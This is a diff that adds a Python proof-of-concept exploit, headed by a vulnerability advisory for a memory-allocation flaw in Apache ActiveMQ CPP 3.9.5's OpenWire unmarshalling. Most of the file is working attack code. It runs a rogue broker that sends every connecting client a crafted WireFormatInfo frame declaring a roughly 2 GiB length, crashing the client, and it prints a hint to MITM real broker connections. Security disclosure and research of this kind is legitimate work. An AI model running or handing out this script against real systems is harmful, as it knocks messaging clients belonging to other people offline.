@@ -1,0 +1,119 @@
+#!/usr/bin/env python
+#
+#
+# Apache ActiveMQ CPP 3.9.5 (OpenWireFormat::unmarshal) Denial of Service
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://activemq.apache.org
+# Affected version: 3.9.5
+#
+# Summary: ActiveMQ CPP is a messaging library that can use multiple
+# protocols to talk to a MOM (e.g. ActiveMQ).
+#
+# Desc: Apache ActiveMQ CPP suffers from an uncontrolled memory allocation
+# vulnerability in its OpenWire byte-array unmarshalling. The unmarshal
+# routines read a 32-bit size from the wire and resize a buffer to that
+# size with no upper bound, and the inbound path enforces no maximum frame
+# size. A malicious or MitM broker can set this length to 0x7FFFFFFF in
+# the WireFormatInfo it sends as its first frame (before the client authenticates),
+# forcing a ~2 GiB allocation that throws std::bad_alloc, uncaught in the
+# unmarshal path, and crashes the client. This results in a remote denial
+# of service.
+#
+# ========================================================================
+# activemq-cpp/src/main/activemq/wireformat/openwire/marshal/BaseDataStreamMarshaller.cpp:
+# ........................................................................................
+# activemq-cpp/src/main/activemq/wireformat/openwire/OpenWireFormat.cpp:
+# ......................................................................
+#
+# // BaseDataStreamMarshaller.cpp (looseUnmarshalByteArray, tightUnmarshalByteArray)
+# int size = dataIn->readInt();
+# if (size > 0) {
+#     data.resize(size);
+#     dataIn->readFully(&data[0], (int) data.size());
+# }
+#
+# ...
+#
+# // OpenWireFormat::unmarshal
+# if (!sizePrefixDisabled) {
+#     dis->readInt();
+# }
+# ========================================================================
+#
+# Tested on: Microsoft Windows 10 (x86-64)
+#            g++ 15.2.0 (MSYS2 UCRT64)
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6034
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6034
+#
+#
+# 13.08.2026
+#
+
+
+import socket
+import struct
+import sys
+
+WIREFORMAT_INFO = 0x01
+MAGIC           = b"ActiveMQ"
+OPENWIRE_VER    = 12
+EVIL_LEN        = 0x7FFFFFFF
+
+def evil_frame():
+    body  = struct.pack("!B", WIREFORMAT_INFO)
+    body += MAGIC
+    body += struct.pack("!i", OPENWIRE_VER)
+    body += struct.pack("!B", 0x01)
+    body += struct.pack("!I", EVIL_LEN)
+    return struct.pack("!i", len(body)) + body
+
+def show():
+    f = evil_frame()
+    print("Malicious WireFormatInfo frame (%d bytes):" % len(f))
+    print(" ".join("%02x" % b for b in f))
+    print("\nField breakdown:")
+    print("  00 00 00 12                 frame size prefix (read then discarded by the client)")
+    print("  01                          command type = WIREFORMAT_INFO")
+    print("  41 63 74 69 76 65 4d 51     magic = 'ActiveMQ' (8-byte const array)")
+    print("  00 00 00 0c                 version = 12")
+    print("  01                          marshalledProperties: present")
+    print("  7f ff ff ff                 marshalledProperties length = 0x7FFFFFFF <-- data.resize() DoS")
+
+def serve(host, port):
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind((host, port)); srv.listen(16)
+    frame = evil_frame()
+    print("[*] Rogue OpenWire broker on %s:%d" % (host, port))
+    print("[*] Point an ActiveMQ-CPP client here (tcp://%s:%d) or MITM its broker connection." % (host, port))
+    print("[*] On connect: sending WireFormatInfo with marshalledProperties length=0x7FFFFFFF (~2 GiB resize).")
+    while True:
+        try:
+            c, a = srv.accept()
+        except KeyboardInterrupt:
+            print("\n[*] bye"); break
+        print("[+] Client connected from %s:%d -- sending oversized-alloc frame" % a)
+        try:
+            c.sendall(frame)
+        except Exception as e:
+            print("[!] Send error: %s" % e)
+        try:
+            c.close()
+        except Exception:
+            pass
+        print("[*] Frame sent -> victim allocates ~2 GiB in looseUnmarshalByteArray -> bad_alloc/crash (DoS)")
+
+if __name__ == "__main__":
+    if "--show" in sys.argv or "-s" in sys.argv:
+        show(); sys.exit(0)
+    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 61616
+    serve(host, port)
